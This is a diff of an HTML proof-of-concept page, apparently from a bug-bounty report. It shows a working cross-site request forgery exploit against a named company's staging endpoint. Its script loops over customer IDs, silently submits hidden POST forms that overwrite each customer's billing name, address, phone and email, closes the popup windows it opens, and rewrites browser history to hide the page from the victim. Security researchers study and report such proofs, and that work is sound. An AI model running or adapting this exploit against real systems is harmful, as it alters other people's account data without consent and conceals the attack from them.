@@ -1,63 +1,64 @@
-<html>  
-<body>  
-<script>  
-// <-- replace these with real customer IDs -->  
-const customers = [6665,6762,22974];
+<!doctype html>
+<html>
+  <body>
+    <script>
+      // <-- replace these with real customer IDs -->
+      const customers = [6665,6762,22974];
 
-const actionUrl = "https://stagingdev.pestroutes.com/resources/delegates/customerDelegate";  
-const delayMs = 1000; // 1 second between requests
+      const actionUrl = "https://stagingdev.pestroutes.com/resources/delegates/customerDelegate";
+      const delayMs = 1000; // 1 second between requests
 
-customers.forEach((id, i) => {  
-setTimeout(() => {  
-const form = document.createElement("form");  
-form.action = actionUrl;  
-form.method = "POST";
+      customers.forEach((id, i) => {
+        setTimeout(() => {
+          const form = document.createElement("form");
+          form.action = actionUrl;
+          form.method = "POST";
 
-const addHidden = (name, value) => {  
-const inp = document.createElement("input");  
-inp.type = "hidden";  
-inp.name = name;  
-inp.value = value;  
-form.appendChild(inp);  
-};
+          const addHidden = (name, value) => {
+            const inp = document.createElement("input");
+            inp.type = "hidden";
+            inp.name = name;
+            inp.value = value;
+            form.appendChild(inp);
+          };
 
-// fields from the original PoC  
-addHidden("billingFName", "david123");  
-addHidden("billingLName", "testTriage");  
-addHidden("customerID", String(id));  
-addHidden("billingAddress", "test");  
-addHidden("billingZip", "");  
-addHidden("billingCity", "San Diego");  
-addHidden("billingState", "AL");  
-addHidden("billingCountryID", "US");  
-addHidden("billingSmsIsDeliverable", "");  
-addHidden("billingPhone", "2106548484");  
-addHidden("billingEmail", "aaa@aaaa.aaa");  
-addHidden("billingCompanyName", "");  
-addHidden("action", "saveBillingAddress");
+          // fields from the original PoC
+          addHidden("billingFName", "triage");
+          addHidden("billingLName", "testTriage");
+          addHidden("customerID", String(id));
+          addHidden("billingAddress", "test");
+          addHidden("billingZip", "");
+          addHidden("billingCity", "CityTriage");
+          addHidden("billingState", "AL");
+          addHidden("billingCountryID", "US");
+          addHidden("billingSmsIsDeliverable", "");
+          addHidden("billingPhone", "1231231234");
+          addHidden("billingEmail", "aaa@aaaa.aaa");
+          addHidden("billingCompanyName", "");
+          addHidden("action", "saveBillingAddress");
 
-// Open a new window and submit the form there  
-const newWindow = window.open('about:blank', `customer_${id}`);  
-if (newWindow) {  
-newWindow.document.body.appendChild(form);  
-form.submit();
+          // Open a new window and submit the form there
+          const newWindow = window.open('about:blank', `customer_${id}`);
+          if (newWindow) {
+            newWindow.document.body.appendChild(form);
+            form.submit();
+            
+            // Optionally close the window after some time
+            setTimeout(() => {
+              try {
+                newWindow.close();
+              } catch (e) {
+                // Window might be blocked from closing
+                console.log('Could not close window');
+              }
+            }, 3000);
+          }
 
-// Optionally close the window after some time  
-setTimeout(() => {  
-try {  
-newWindow.close();  
-} catch (e) {  
-// Window might be blocked from closing  
-console.log('Could not close window');  
-}  
-}, 3000);  
-}
+        }, i * delayMs);
+      });
 
-}, i * delayMs);  
-});
-
-// hide PoC URL from the victim's history  
-history.pushState('', '', '/');  
-</script>  
-</body>  
+      // hide PoC URL from the victim's history
+      history.pushState('', '', '/');
+    </script>
+  </body>
 </html>
